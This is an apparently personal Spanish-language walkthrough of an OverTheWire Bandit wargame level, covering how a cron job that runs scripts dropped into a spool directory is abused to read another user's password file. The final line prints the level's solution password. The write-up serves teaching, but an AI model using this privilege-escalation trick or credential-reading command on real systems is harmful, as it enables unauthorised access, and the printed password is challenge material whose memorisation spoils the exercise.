Se está corriendo un trabajo [[Tareas Cron|cron]] en el servidor. Nos dicen que podemos revisar el directorio `/etc/cron.d.` para encontrar el archivo de configuración para la tarea.

El archivo que nos interesa es `/etc/crond.d/cronjob_bandit24`. Esta es la tarea programada del nivel.

Contiene:

```plaintext
@reboot bandit24 /usr/bin/cronjob_bandit24.sh  &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh  &> /dev/null
```

Reviso el contenido del script que se ejecuta cada minuto:

```bash
cat /usr/bin/cronjob_bandit24.sh
```

Script que se ejecuta como bandit 24:

```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

Ejecuta los scripts del directorio `cd /var/spool/bandit24/foo` si el propietario del archivo es igual a *bandit23*, posteriormente los elimina.

Creamos un directorio temporal para crear el script que pondremos en el directorio */.../foo*.

```bash
mktemp -d
```

Debemos cambiar los permisos de esta carpeta para que otros usuarios puedan poner cosas dentro, pues cuando se ejecute el script se hará con el usuario *bandit24*.

```bash
chmod o+wx /tmp/rutaTemporal
```

Creé el siguiente script:

```bash
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/tmp.A1knUOrWDQ/pass.txt
```

Consulta la contraseña de *bandit24* con sus privilegios y la envía al directorio temporal.

El script debe tener permiso de ejecución:

```bash
chmod o+x script.sh
```

Lo copié a la carpeta y esperé:

```bash
cp script.sh /var/spool/bandit24/foo/script.sh
```

**Password for bandit 24:**
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8